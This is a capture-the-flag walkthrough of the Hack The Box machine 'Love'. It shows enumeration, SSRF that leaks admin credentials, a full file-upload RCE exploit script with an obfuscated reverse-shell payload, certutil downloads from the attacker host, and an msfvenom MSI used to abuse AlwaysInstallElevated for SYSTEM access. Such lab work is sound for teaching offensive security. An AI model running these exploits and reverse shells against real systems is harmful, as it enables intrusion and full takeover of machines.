# Love - Easy

```sh
sudo vim /etc/hosts
# add love.htb

nmap -T4 -p- -A -Pn -v love.htb
```

* open ports & services:

    * 80/tcp - http - Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
    * 135/tcp - msrpc - Microsoft Windows RPC
    * 139/tcp - netbios-ssn - Microsoft Windows netbios-ssn
    * 443/tcp - ssl/http - Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
    * 445/tcp - microsoft-ds - Windows 10 Pro 19042 microsoft-ds
    * 3306/tcp - mysql
    * 5000/tcp - http - Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
    * 5985/tcp - http - Microsoft HTTPAPI httpd 2.0
    * 5986/tcp - ssql/http - Microsoft HTTPAPI httpd 2.0
    * 47001/tcp - http - Microsoft HTTPAPI httpd 2.0
    * 49664-49670/tcp - msrpc - Microsoft Windows RPC

* enumerating SMB & RPC:

    ```sh
    rpcclient -U "" love.htb
    # NT_STATUS_LOGON_FAILURE

    rpcinfo -p love.htb
    # connection refused

    smbmap -H love.htb
    # error

    enum4linux-ng love.htb -A
    # only able to give OS info

    smbclient -N -L //love.htb
    # NT_STATUS_ACCESS_DENIED

    crackmapexec smb love.htb --shares -u '' -p ''
    # STATUS_ACCESS_DENIED

    crackmapexec smb love.htb --shares -u 'Guest' -p ''
    # STATUS_ACCOUNT_DISABLED
    ```

* the webpage on port 80 is titled 'Voting System using PHP' and has a login page with the fields "voter's ID" & "password"

* if we use a login like 'admin:admin', it gives the error "cannot find voter with the ID" - so it is checking for a specific format or looking up voter IDs

* web scan:

    ```sh
    gobuster dir -u http://love.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md,zip,bac,bak,aspx,json,docx,pdf,db -t 25
    # dir scan with some extensions

    ffuf -c -u 'http://love.htb' -H 'Host: FUZZ.love.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 4388 -s
    # subdomain scan
    ```

* ```gobuster``` gives us a few pages:

    * /admin - redirects to a login page, but this is a different login page with 'username' & 'password' fields
    * /dist - does not give any useful info
    * /home.php - redirects to login page
    * /images - does not give any useful info
    * /includes - this includes several PHP scripts
    * /plugins - does not give any useful info

* checking the '/admin' page, if we use creds like 'test:test', it gives the error 'cannot find account with the username'; however, if we use 'admin:admin', it gives the error 'incorrect password' - this indicates user 'admin' exists

* the '/includes' directory contains several PHP scripts, and by the name it seems relevant to the main voting webpage, but we cannot read it:

    * /ballot_modal.php
    * /conn.php
    * /footer.php
    * /navbar.php
    * /scripts.php
    * /session.php
    * /slugify.php

* subdomain scan using ```ffuf``` gives the subdomain 'staging.love.htb' - add this entry to ```/etc/hosts```; this subdomain is also found from the ```nmap``` scan results

* navigating to 'http://staging.love.htb' leads to a 'Free File Scanner' webpage - this has a sign-up page with the fields 'name' & 'email', and a demo page at '/beta.php'

* scan this webpage for any secrets:

    ```sh
    gobuster dir -u http://staging.love.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md,zip,bac,bak,aspx,json,docx,pdf,db -t 25
    # dir scan
    ```

* checking the demo page, we have a 'File security checker' with an input field for 'file URL' - where we can enter the URL of the file to be scanned, and submit

* we can intercept a valid request in Burp Suite to check this further

* on submitting a test value, we can see that the page sends a POST request to '/beta.php' with the data "file=test&read=Scan+file", but the response comes out blank

* we can check with a valid URL by hosting a file on our machine - setup a server using ```python3 -m http.server``` and we can use a sample existing file in the URL to submit - 'http://10.10.14.8:8000/test.txt'

* we can see that the target app is able to fetch our file, and in the response it prints the contents of the page

* we can similarly test to check if the app is able to fetch its own pages, by submitting a URL like 'http://127.0.0.1:80/', and it works - the response even renders the page, but does not show PHP code

* however, this cannot be used to get a PHP reverse shell or a webshell right away, as the webpage either prints the page contents, or renders it but interacting with it reloads the webpage

* we can try to read the PHP scripts from earlier, and it is able to fetch the files, but we cannot read the PHP code

* we can try to fuzz this endpoint in various ways to check for any clues:

    ```sh
    # attempt internal port enum
    for i in {1..65535};do echo $i >> ports.txt;done

    ffuf -u 'http://staging.love.htb/beta.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'file=http://127.0.0.1:FUZZ&read=Scan+file' -w ports.txt -fs 4997 -s
    # local port enum using ffuf
    ```

* the local port enumeration shows various ports - 80, 443, 5000, 5985

* port 5000, which was showing as forbidden when accessed usually, can be checked for any secrets

* if we submit the URL 'http://127.0.0.1:5000' in '/beta.php', the response shows the code for an internal password dashboard for the voting system admin - the response also includes the vote admin creds 'admin:@LoveIsInTheAir!!!!'

* using these creds, we can try logging into the voting system at 'http://love.htb/index.php', but this fails

* however, using these creds in the admin page at 'http://love.htb/admin' works, and we get access to the 'VotingSystem' dashboard; the webpage footer mentions 'SourceCodeSter' copyright

* Googling for exploits associated with 'VotingSystem SourceCodeSter' gives us multiple authenticated RCE exploits

* we can attempt [this file upload RCE exploit](https://www.exploit-db.com/exploits/49445) - the exploit needs to be edited with the correct URL formats for it to work:

    ```py
    import requests

    IP = "love.htb" # Website's URL
    USERNAME = "admin" #Auth username
    PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
    REV_IP = "10.10.14.8" # Reverse shell IP
    REV_PORT = "4444" # Reverse port 

    INDEX_PAGE = f"http://{IP}/admin/index.php"
    LOGIN_URL = f"http://{IP}/admin/login.php"
    VOTE_URL = f"http://{IP}/admin/voters_add.php"
    CALL_SHELL = f"http://{IP}/images/shell.php"

    payload = """
    
    <?php

    header('Content-type: text/plain');
    $ip   = "IIPP";
    $port = "PPOORRTT";
    $payload = "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";
    $evalCode = gzinflate(base64_decode($payload));
    $evalArguments = " ".$port." ".$ip;
    $tmpdir ="C:\\windows\\temp";
    chdir($tmpdir);
    $res .= "Using dir : ".$tmpdir;
    $filename = "D3fa1t_shell.exe";
    $file = fopen($filename, 'wb');
    fwrite($file, $evalCode);
    fclose($file);
    $path = $filename;
    $cmd = $path.$evalArguments;
    $res .= "\n\nExecuting : ".$cmd."\n";
    echo $res;
    $output = system($cmd);
                            
    ?>
    """
    payload = payload.replace("IIPP", REV_IP)
    payload = payload.replace("PPOORRTT", REV_PORT)

    s = requests.Session()

    def getCookies():
        r = s.get(INDEX_PAGE)
        return r.cookies

    def login():
        cookies = getCookies()
        data = {
            "username":USERNAME,
            "password":PASSWORD,
            "login":""
        }
        r = s.post(LOGIN_URL, data=data, cookies=cookies)
        if r.status_code == 200:
            print("Logged in")
            return True
        else:
            return False

    def sendPayload():
        if login():
            global payload
            payload = bytes(payload, encoding="UTF-8")
            files  = {'photo':('shell.php',payload, 
                        'image/png', {'Content-Disposition': 'form-data'}
                    ) 
                }
            data = {
                "firstname":"a",
                "lastname":"b",
                "password":"1",
                "add":""
            }
            r = s.post(VOTE_URL, data=data, files=files)
            if r.status_code == 200:
                print("Poc sent successfully")
            else:
                print("Error")

    def callShell():
        r = s.get(CALL_SHELL, verify=False)
        if r.status_code == 200:
            print("Shell called check your listiner")
    print("Start a NC listner on the port you choose above and run...")
    sendPayload()
    callShell()
    ```

    ```sh
    nc -nvlp 4444
    # setup listener

    python3 49445.py
    ```

* the exploit works and we get reverse shell:

    ```cmd
    whoami
    # 'phoebe'

    pwd
    # 'C:\xampp\htdocs\omrs\images'

    dir C:\

    dir C:\Users
    # 'phoebe' and 'administrator'

    dir C:\Users\Phoebe\

    type C:\Users\Phoebe\Desktop\user.txt
    # user flag

    # attempt enum using winpeas - fetch exe from attacker

    cd C:\Windows\Temp

    certutil.exe -urlcache -f http://10.10.14.8:8000/winPEASx64.exe winpeas.exe

    .\winpeas.exe
    ```

* findings from ```winpeas```:

    * Microsoft Windows 10 Pro, build 19042
    * Windows Defender AV detected
    * PS history file found at ```C:\Users\Phoebe\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt```
    * ```AlwaysInstallElevated``` set to 1 in HKLM & HKCU
    * non-default directory ```C:\administration``` found, where 'Phoebe' has ```AllAccess``` rights
    * Administrator user logged in recently

* the PS history file does not contain anything useful, so we can check the non-default directory next:

    ```cmd
    cd C:\Administration

    dir

    type manifest.txt
    ```

* the ```C:\Administration``` directory contains a few files related to VMWare, but nothing else is here that can be abused

* as ```AlwaysInstallElevated``` is set to 1 for both HKLM & HKCU, we can try to abuse it by generating a malicious MSI file:

    ```sh
    # on attacker
    msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.8 lport=4445 -f msi > revsh.msi
    # generate msi payload

    python3 -m http.server
    # host the payload

    nc -nvlp 4445
    # setup listener
    ```

    ```cmd
    # on target
    cd C:\Windows\Temp

    certutil.exe -urlcache -f http://10.10.14.8:8000/revsh.msi revsh.msi

    msiexec /quiet /qn /i revsh.msi
    # execute payload
    ```

    ```sh
    # on attacker
    # we get reverse shell

    whoami
    # nt authority\system

    type C:\Users\Administrator\Desktop\root.txt
    # root flag
    ```
